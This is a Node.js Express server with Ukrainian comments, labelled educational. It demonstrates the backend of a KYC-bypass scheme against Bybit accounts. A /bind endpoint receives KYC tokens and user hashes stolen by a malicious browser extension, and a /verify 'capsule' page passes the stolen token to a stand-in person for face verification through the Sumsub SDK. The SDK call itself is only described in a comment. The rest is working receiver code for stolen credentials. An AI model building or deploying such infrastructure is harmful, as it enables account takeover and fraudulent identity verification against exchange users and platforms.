/**
 * EDUCATIONAL PURPOSE ONLY
 * Цей сервер демонструє, як зловмисні розширення (або легітимні інтеграції)
 * отримують токени та передають їх на бекенд для подальшого використання.
 */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();

// Дозволяємо CORS, оскільки запити будуть йти з розширення (з доменів Bybit або chrome-extension://)
app.use(cors({
    origin: '*' // В реальності зловмисники дозволяють усі домени
}));

app.use(express.json());

// База даних у пам'яті (Для навчання). В реальності тут Redis або база даних.
const sessions = new Map();

/**
 * Ендпоінт /bind (Або /api/kyc/receiver)
 * Сюди розширення відправляє вкрадений токен KYC та UID користувача.
 */
app.post('/bind', (req, res) => {
    const { hash: uidHash, token: kycToken } = req.body;

    if (!kycToken) {
        return res.status(400).json({ status: "error", message: "KYC Token is missing" });
    }

    // Зловмисник генерує унікальне "посилання" (капсулу) для дропа, який буде проходити KYC
    const linkId = crypto.randomBytes(12).toString('hex');

    // Зберігаємо токен у базі, прив'язуючи його до linkId
    sessions.set(linkId, {
        uidHash: uidHash || "Unknown",
        kycToken: kycToken,
        createdAt: new Date().toISOString()
    });

    console.log(`\n[+] [EDUCATIONAL LOG] Отримано новий KYC токен!`);
    console.log(`    UID Hash: ${uidHash}`);
    console.log(`    Створено лінк для обходу: /verify?linkId=${linkId}`);

    // Повертаємо linkId розширенню, щоб воно (або зловмисник) знало, куди переходити
    res.json({ status: "success", linkId: linkId });
});

/**
 * Ендпоінт /verify (Сторінка "Капсули")
 * Це сторінка, яку відкриває "Дроп" (людина, яка здає обличчя) на іншому пристрої.
 * Тут ініціалізується SDK (наприклад, Sumsub) за допомогою викраденого токена.
 */
app.get('/verify', (req, res) => {
    const { linkId } = req.query;

    if (!linkId || !sessions.has(linkId)) {
        return res.status(404).send("<h2>[Educational] Помилка: Посилання недійсне або протерміноване</h2>");
    }

    const sessionData = sessions.get(linkId);

    // В реальному експлойті тут був би код ініціалізації Sumsub Web SDK (або іншого).
    // Він би використав kycToken, щоб змусити систему думати, що це той самий користувач на Bybit.
    const htmlResponse = `
        <!DOCTYPE html>
        <html lang="uk">
        <head>
            <meta charset="UTF-8">
            <title>KYC Capsule (Educational)</title>
            <style>
                body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 40px; color: #333; }
                .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
                .token { background: #eee; padding: 10px; word-break: break-all; font-family: monospace; border-radius: 4px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Сторінка верифікації (Капсула Bypass)</h2>
                <hr>
                <p><b>Зв'язаний UID Hash:</b> ${sessionData.uidHash}</p>
                <p><b>Час створення:</b> ${sessionData.createdAt}</p>
                <p><b>KYC Token (Sumsub Token):</b></p>
                <div class="token">${sessionData.kycToken}</div>
                <hr>
                <p><i>Для наукових цілей:</i> В цьому місці на сторінці зловмисників відмальовувався б фрейм або компонент камери від Sumsub SDK за допомогою токена вище. Коли людина проходить перевірку обличчя через цей фрейм, верифікація зараховується на оригінальний акаунт Bybit.</p>
            </div>
        </body>
        </html>
    `;

    res.send(htmlResponse);
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n========================================`);
    console.log(`[EDUCATIONAL] Сервер-приймач запущено на порту ${PORT}`);
    console.log(`Очікування POST запитів від розширення на http://localhost:${PORT}/bind`);
    console.log(`========================================\n`);
});
